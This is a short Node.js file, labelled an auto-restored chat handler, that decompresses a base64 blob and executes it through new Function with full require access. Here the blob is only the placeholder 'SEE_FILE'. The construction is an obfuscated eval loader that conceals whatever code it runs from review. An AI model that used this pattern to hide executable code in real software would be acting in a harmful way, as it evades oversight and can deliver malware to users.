/* Auto-restored chat handler (compressed payload) */
const zlib = require("zlib");
const code = zlib.inflateSync(Buffer.from("SEE_FILE", "base64")).toString("utf8");
module.exports = new Function(
  "require",
  "module",
  "exports",
  "__dirname",
  "__filename",
  code + "\n;return module.exports;"
)(require, module, exports, __dirname, __filename);
